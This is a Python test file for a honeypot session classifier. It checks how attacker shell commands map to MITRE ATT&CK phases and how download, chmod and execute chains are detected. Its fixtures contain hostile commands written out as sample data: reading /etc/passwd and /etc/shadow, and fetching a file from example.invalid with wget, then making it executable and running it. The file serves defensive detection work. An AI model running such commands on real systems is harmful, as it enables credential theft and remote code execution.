from __future__ import annotations

import hashlib

from production.classification.classification_pipeline import NotebookParityClassifier
from production.classification.durable_replay import reclassify_durable_prefix
from production.classification.environment import load_classifier_environment
from production.prediction.evidence_cutoff import validate_evidence_cutoff
from production.prediction.trusted_history import (
    build_prediction_trusted_history_manifest,
    validate_prediction_trusted_history_manifest,
)
from production.reporting.typed_semantic_chain_selection import (
    select_typed_semantic_chains,
)
from production.workers.session_monitor import SessionMonitor
from production.utils.serialization import stable_json
from tests.test_cross_family_relationship_evaluation import _build


CHAIN_RULE = {
    "rule_id": "typed-transfer-permission-execution",
    "required_operation_types": [
        "transfer_attempt",
        "permission_modify",
        "execution_attempt",
    ],
    "minimum_incomplete_operation_count": 2,
}


class _Mitre:
    @staticmethod
    def get_name(ttp: str) -> str:
        return ttp

    @staticmethod
    def get_tactics(ttp: str) -> list[str]:
        return {
            "T1087.001": ["discovery"],
            "T1003": ["credential-access"],
        }.get(ttp, ["discovery"])


def _snapshot(events: list[dict]) -> dict:
    entries = [
        {
            "event_id": f"event-{index}",
            "received_at": f"2026-08-13T00:00:{index:02d}.000000+00:00",
            "payload_sha256": hashlib.sha256(
                stable_json(event).encode("utf-8")
            ).hexdigest(),
        }
        for index, event in enumerate(events)
    ]
    basis = {
        "schema_version": "durable_session_event_manifest.v1",
        "session_id": "phase2-replay",
        "through_event_id": entries[-1]["event_id"],
        "through_received_at": entries[-1]["received_at"],
        "event_entries": entries,
    }
    return {
        **basis,
        "event_count": len(events),
        "manifest_sha256": hashlib.sha256(
            stable_json(basis).encode("utf-8")
        ).hexdigest(),
        "events": events,
    }


def test_first_multi_label_command_is_one_phase_in_realtime_and_replay() -> None:
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=_Mitre())
    event = {
        "eventid": "cowrie.command.input",
        "session": "phase2-replay",
        "src_ip": "203.0.113.20",
        "timestamp": "2026-08-13T00:00:00Z",
        "input": "cat /etc/passwd /etc/shadow",
    }
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    cutoff = {
        "schema_version": "prediction_evidence_cutoff.v1",
        "received_at": "2026-08-13T00:00:00.000000+00:00",
        "event_id": "event-0",
    }
    monitor.on_event(event, durable_evidence_order=cutoff)
    realtime = monitor.get_session("phase2-replay")
    assert realtime is not None
    assert len(realtime.prediction_trusted_history) == 1
    assert len(realtime.prediction_trusted_history[0]["labels"]) == 2

    replay = reclassify_durable_prefix(
        {"session_id": "phase2-replay", "classification_events": []},
        _snapshot([event]),
        classifier,
        load_classifier_environment(),
    )
    assert len(replay["prediction_trusted_history"]) == 1
    assert len(replay["prediction_trusted_history"][0]["labels"]) == 2
    manifest = replay["prediction_trusted_history_manifest"]
    assert validate_evidence_cutoff(manifest["evidence_cutoff"]) == []
    assert validate_prediction_trusted_history_manifest(manifest) == []
    assert manifest["evidence_cutoff"] == {
        "schema_version": "prediction_evidence_cutoff.v1",
        "received_at": "2026-08-13T00:00:00.000000+00:00",
        "event_id": "event-0",
    }
    realtime_manifest = build_prediction_trusted_history_manifest(
        phases=realtime.prediction_trusted_history,
        evidence_cutoff=cutoff,
        classifier_environment=load_classifier_environment(),
    )
    assert realtime_manifest == manifest


def test_repeated_semantic_label_is_collapsed_without_losing_live_evidence() -> None:
    """Reproduce the live ``id``/``whoami`` duplicate in one discovery phase."""

    commands = ["id", "uname -a", "pwd", "whoami", "echo controlled-e2e-finalizer", "date -u", "exit"]
    events = [
        {
            "eventid": "cowrie.command.input",
            "session": "phase2-replay",
            "src_ip": "203.0.113.20",
            "timestamp": f"2026-08-13T00:00:{index:02d}Z",
            "input": command,
        }
        for index, command in enumerate(commands)
    ]
    classifier = NotebookParityClassifier(bert_fn=None, mitre_db=_Mitre())
    monitor = SessionMonitor(
        mitre_db=_Mitre(),
        classification_fn=classifier.classify,
        classification_policy={"strategy": "notebook_merge"},
    )
    for index, event in enumerate(events):
        monitor.on_event(
            event,
            durable_evidence_order={
                "schema_version": "prediction_evidence_cutoff.v1",
                "received_at": f"2026-08-13T00:00:{index:02d}.000000+00:00",
                "event_id": f"event-{index}",
            },
        )

    realtime = monitor.get_session("phase2-replay")
    assert realtime is not None
    phase = realtime.prediction_trusted_history[0]
    assert [(item["tactic"], item["technique"]) for item in phase["labels"]] == [
        ("discovery", "T1033"),
        ("discovery", "T1082"),
        ("discovery", "T1083"),
    ]
    assert phase["evidence_refs"] == ["event-0", "event-1", "event-2", "event-3"]

    replay = reclassify_durable_prefix(
        {"session_id": "phase2-replay", "classification_events": []},
        _snapshot(events),
        classifier,
        load_classifier_environment(),
    )
    manifest = replay["prediction_trusted_history_manifest"]
    assert manifest["original_trusted_label_count"] == 4
    assert len(manifest["ordered_trusted_phases"][0]["labels"]) == 3
    assert manifest["ordered_trusted_phases"][0]["evidence_refs"] == phase["evidence_refs"]
    realtime_manifest = build_prediction_trusted_history_manifest(
        phases=realtime.prediction_trusted_history,
        evidence_cutoff={
            "schema_version": "prediction_evidence_cutoff.v1",
            "received_at": "2026-08-13T00:00:06.000000+00:00",
            "event_id": "event-6",
        },
        classifier_environment=load_classifier_environment(),
        original_trusted_label_count=realtime.prediction_trusted_label_count,
        original_command_count=len(commands),
        audit_only_label_count=realtime.prediction_audit_only_label_count,
    )
    assert realtime_manifest == manifest


def test_retry_aware_selection_finds_later_complete_same_path_subsequence() -> None:
    fact_set, report = _build({
        "case_id": "phase2-retry",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "failure"),
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    # The current authoritative selector is v2; the former v3 assertion was
    # a stale representation expectation (REPLAY-03), not a migration target.
    assert selection["schema_version"] == "typed_semantic_chain_selection.v2"
    assert [match["status"] for match in selection["matches"]] == ["complete"]
    assert [finding["finding_type"] for finding in report["behavioral_findings"]] == [
        "connected_transfer_permission_execution"
    ]


def test_failed_prerequisite_without_successful_replacement_abstains() -> None:
    fact_set, report = _build({
        "case_id": "phase2-no-retry",
        "events": [
            ("wget https://example.invalid/a -O /tmp/a", "failure"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    assert select_typed_semantic_chains(fact_set, [CHAIN_RULE])["matches"] == []
    assert not any(
        finding.get("finding_type") == "connected_transfer_permission_execution"
        for finding in report["behavioral_findings"]
    )


def test_confirmed_cwd_resolves_relative_complete_chain() -> None:
    fact_set, report = _build({
        "case_id": "phase2-cwd",
        "events": [
            ("cd /tmp", "success"),
            ("wget https://example.invalid/a -O a.sh", "success"),
            ("chmod 700 a.sh", "success"),
            ("./a.sh", "success"),
        ],
    })
    selection = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    assert [match["status"] for match in selection["matches"]] == ["complete"]
    match = selection["matches"][0]
    assert match["entity_ref"]
    assert any(
        finding.get("finding_type") == "connected_transfer_permission_execution"
        for finding in report["behavioral_findings"]
    )


def test_failed_or_ambiguous_cwd_and_mismatched_paths_abstain() -> None:
    for case in (
        {
            "case_id": "phase2-failed-cwd",
            "events": [
                ("cd /tmp", "failure"),
                ("wget https://example.invalid/a -O a.sh", "success"),
                ("chmod 700 a.sh", "success"),
                ("./a.sh", "success"),
            ],
        },
        {
            "case_id": "phase2-variable-cwd",
            "events": [
                ("cd $TARGET", "success"),
                ("wget https://example.invalid/a -O a.sh", "success"),
                ("chmod 700 a.sh", "success"),
                ("./a.sh", "success"),
            ],
        },
        {
            "case_id": "phase2-mismatch",
            "events": [
                ("wget https://example.invalid/a -O /tmp/a", "success"),
                ("chmod 700 /tmp/b", "success"),
                ("/tmp/c", "success"),
            ],
        },
    ):
        fact_set, _report = _build(case)
        assert select_typed_semantic_chains(fact_set, [CHAIN_RULE])["matches"] == []


def test_retry_search_is_deterministic_and_bounded_for_long_session() -> None:
    failed = [
        ("wget https://example.invalid/a -O /tmp/a", "failure")
        for _ in range(200)
    ]
    fact_set, _report = _build({
        "case_id": "phase2-long-retry",
        "events": failed + [
            ("wget https://example.invalid/a -O /tmp/a", "success"),
            ("chmod 700 /tmp/a", "success"),
            ("/tmp/a", "success"),
        ],
    })
    first = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    second = select_typed_semantic_chains(fact_set, [CHAIN_RULE])
    assert first == second
    assert [match["status"] for match in first["matches"]] == ["complete"]
